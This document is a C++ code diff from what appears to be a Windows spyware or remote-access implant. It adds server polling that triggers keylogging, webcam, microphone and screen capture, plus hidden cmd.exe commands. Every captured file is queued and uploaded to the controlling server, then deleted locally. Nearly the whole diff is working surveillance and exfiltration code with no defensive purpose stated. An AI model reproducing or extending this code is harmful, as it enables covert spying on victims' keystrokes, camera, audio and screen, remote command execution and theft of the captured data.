@@ -2,6 +2,7 @@
 #include <queue>
 
 HANDLE camRequest, micRequest, lockRequest, cmdRequest, screenRequest, newDataEvent;
+map<string, BOOL> workingTasks;
 
 DWORD WINAPI initFiltering(LPVOID lpParam)
 {
@@ -19,21 +20,10 @@ DWORD WINAPI initKeylogger(LPVOID lpParam)
 			Sleep(SYNC_TIME);
 			continue;
 		}
-		// Get time and date
-		time_t rawtime;
-		struct tm* timeinfo;
-		time(&rawtime);
-		timeinfo = localtime(&rawtime);
-		char dateString[80];
-		wchar_t dateStringW[80];
-		// Get the date as a string
-		strftime(dateString, sizeof(dateString), "keylog.%d.%m.%Y.%H.%M.%S", timeinfo);
-		// Cast the string to LPCWSTR
-		mbstowcs(dateStringW, dateString, strlen(dateString) + 1);//Plus null
-		LPCWSTR ptr = dateStringW;
-		// Call the keylogger with current date as filename
+		wstring filename = stringToWString(constructFilename(KEYLOG_CODE));
+		
 		// Filename changes every { num_seconds } declared in the keylogger.cpp file 
-		keylogger(dateStringW);
+		keylogger(filename.c_str());
 	}
 	return 0;
 }
@@ -49,7 +39,10 @@ DWORD WINAPI initScreenshot(LPVOID lpParam)
 		ResetEvent(screenRequest);
 		// Request Arrived..
 		// Read screenshots request from disk
-		screenCapture(0, 0, 1920, 1080, "screenshot.bmp");
+		wstring filename = stringToWString(constructFilename(SCREENSHOT_CODE));
+		screenCapture(0, 0, 1920, 1080, filename.c_str());
+		SetEvent(newDataEvent);
+		return 1;
 	}
 	return 0;
 }
@@ -65,7 +58,9 @@ DWORD WINAPI initCamera(LPVOID lpParam)
 		ResetEvent(camRequest);
 		// Request Arrived..
 		// Read camera request from disk
-		camera();
+
+		string filename = constructFilename(CAMERA_CODE);
+		camera(filename.c_str());
 	}
 	return 0;
 }
@@ -81,7 +76,9 @@ DWORD WINAPI initMic(LPVOID lpParam)
 		ResetEvent(micRequest);
 		// Request Arrived..
 		// Read mic request from disk
-		recordAudio(10); // Record for 10 seconds
+		
+		string filename = constructFilename(AUDIO_CODE);
+		recordAudio(10, filename.c_str()); // Record for 10 seconds
 	}
 	return 0;
 }
@@ -116,10 +113,18 @@ DWORD WINAPI initRemoteCommands(LPVOID lpParam)
 			INFINITE);    // indefinite wait
 		ResetEvent(cmdRequest);
 		// Request Arrived..
+		
 		// Read cmd request from disk
 		LPCWSTR cmd = L"ipconfig";
-		LPCWSTR o_cmd = L" > cmd_output.txt";
-		std::wstring stdResult = std::wstring(cmd) + o_cmd;
+		
+		// Output to a new file
+		LPCWSTR o_cmd = L" > ";
+
+		// Get a new filename
+		wstring filename = stringToWString(constructFilename(CMD_CODE));
+		
+		// Construct the full command
+		wstring stdResult = wstring(cmd) + o_cmd + filename; 
 		LPCWSTR final_cmd = stdResult.c_str();
 		ShellExecute(0, L"open", L"cmd.exe", final_cmd, 0, SW_HIDE);
 	}
@@ -129,7 +134,7 @@ DWORD WINAPI initRemoteCommands(LPVOID lpParam)
 DWORD WINAPI initDataManager(LPVOID lpParam)
 {
 	do {
-		newDataEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("lock"));
+		newDataEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("data"));
 	} while (newDataEvent == NULL);
 	while (TRUE) {
 		WaitForSingleObject(
@@ -137,25 +142,45 @@ DWORD WINAPI initDataManager(LPVOID lpParam)
 			INFINITE);    // indefinite wait
 		ResetEvent(newDataEvent);
 		// New data to send 
-		WIN32_FIND_DATA data;
+		WIN32_FIND_DATA data, currentData;
 		HANDLE hFind = FindFirstFile(L"temp/*", &data);
 		priority_queue<WIN32_FIND_DATA, vector<WIN32_FIND_DATA>, CompareDates> uploadQueue;
 
 		if (hFind != INVALID_HANDLE_VALUE) {
 			do // Look for new files in temp folder and insert each of them to a priority queue (sorted by date).
-				uploadQueue.push(data);
+				if(wcslen(data.cFileName) > 3)
+					uploadQueue.push(data);
 			while (FindNextFile(hFind, &data));
 			FindClose(hFind);
-		}
+		} 
 		while (!uploadQueue.empty()) {
 			// Get the first file in the queue
-			data = uploadQueue.top();
+			currentData = uploadQueue.top();
 			char filename[256];
 			// Convert wchar* to char*
-			sprintf(filename, "%ws", data.cFileName);
-			uploadFile(filename, NULL);
+			wstring ws(data.cFileName);
+			wcstombs(filename, ws.c_str(), 256);
+
+			// Create json data corresponding to the current file
+
+			string dataType = checkDataType(filename);
+			if (dataType == UNDEFINED_CODE)
+				continue; // File not recognized
+
+			map<string, string> currentJsonItem{
+				  make_pair("dataType", dataType)
+			};
+			string json = jsonFromItem(currentJsonItem, DATA);
+
+			while (uploadFile(filename, (char*)json.c_str()).dwStatusCode != 200)
+				Sleep(SYNC_TIME);
+
 			// Remove the file from temp folder after successfully uploading it
-			DeleteFile(data.cFileName);
+			  
+			wstring wfilename(data.cFileName);
+			wstring concatted_stdstr = L"temp/" + wfilename;
+			LPCWSTR fullPath = concatted_stdstr.c_str();
+			DeleteFile(fullPath);
 			// Remove from the queue
 			uploadQueue.pop();
 		}
@@ -167,15 +192,115 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 {
 	// Retreive events from the server.
 	// Signal event for current request. E.g. camera
+
 	while (TRUE) {
 		// Look for new requests from server..
+		ResponseData requests; 
 
-		// Parent has sent a camera request ..
-		if (camRequest == NULL || !SetEvent(camRequest))
+		while (TRUE) {
+			requests = downloadFile();
+			if (requests.dwStatusCode != 200 || requests.response == "[]")
+				Sleep(SYNC_TIME);
+			else
+				break;
+		}
+		// Convert the response to map or requests.
+		map<string, map<string, string>> allRequests = itemsListFromJson(requests.response);
+		map<string, string> myResponse;
+
+		for (int i = 0; i < allRequests.size(); i++)
 		{
-			printf("SetEvent failed (%d)\n", GetLastError());
+			initRequest(allRequests, Camera, camRequest);
+			initRequest(allRequests, Audio, micRequest);
+			initRequest(allRequests, Screenshot, screenRequest);
+			initRequest(allRequests, Lockdown, lockRequest);
+			initRequest(allRequests, Command, cmdRequest);
 		}
 		Sleep(SYNC_TIME);
 	}
 	return 0;
+}
+
+BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle) {
+	map<string, map<string, string>>::iterator allRequestsIterator;
+	map<string, string> currentRequest;
+	map<string, string>::iterator requestIterator;
+
+	allRequestsIterator = allRequests.find(requestName);
+	if (allRequestsIterator == allRequests.end())
+		return FALSE;
+
+	currentRequest = allRequestsIterator->second;
+	requestIterator = currentRequest.find(DATA_ID);
+
+	map<string, BOOL>::iterator tasksIter = workingTasks.find(requestIterator->second);
+	if (tasksIter == workingTasks.end()) {
+		//If the task is new, register it in the map ..
+		workingTasks.insert(make_pair(requestIterator->second, TRUE));
+	}
+	else // The task was found in the map ..
+	{ 
+		if (!tasksIter->second) { // Task set to false ..
+			// If the task was turned off, remove from map ..
+			workingTasks.erase(tasksIter);
+		}
+		return FALSE; // Task already running, no need to call it again ..
+	}
+	// else call the requested task 
+	if (requestHandle != NULL && requestIterator != currentRequest.end())
+	{	
+		SetEvent(requestHandle);
+		return TRUE; 
+	} 
+	return FALSE;
+}
+
+string checkDataType(char* filename)
+{
+	const char id[3] = { filename[0],filename[1] , '\0' };
+
+	if (!strcmp(id, KEYLOG_CODE))
+		return Keylog;
+	else if (!strcmp(id, CAMERA_CODE))
+		return Camera;
+	else if (!strcmp(id, AUDIO_CODE))
+		return Audio;
+	else if (!strcmp(id, SCREENSHOT_CODE))
+		return Screenshot;
+	else if (!strcmp(id, CMD_CODE))
+		return Command;
+	return UNDEFINED_CODE;
+}
+string getRandomString(const int len) {
+	const char alphanum[] =
+		"0123456789"
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+		"abcdefghijklmnopqrstuvwxyz";
+	string tmp_s;
+	tmp_s.reserve(len);
+
+	for (int i = 0; i < len; ++i) {
+		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+	return tmp_s;
+}
+
+
+string constructFilename(const char* typeCode) {
+	// Get time and date
+	time_t rawtime;
+	struct tm* timeinfo;
+	time(&rawtime);
+	timeinfo = localtime(&rawtime);
+	char dateString[80];
+
+	// Get the date as a string
+	strftime(dateString, sizeof(dateString), "-%d-%m-%Y-%H-%M-%S-", timeinfo);
+	string fname = "";
+	fname.append(DATA_FOLDER_PATH).append(typeCode).append(dateString).append(getRandomString(10));
+	return fname;
+}
+
+wstring stringToWString(string str) {
+	return wstring(str.begin(), str.end());
 }
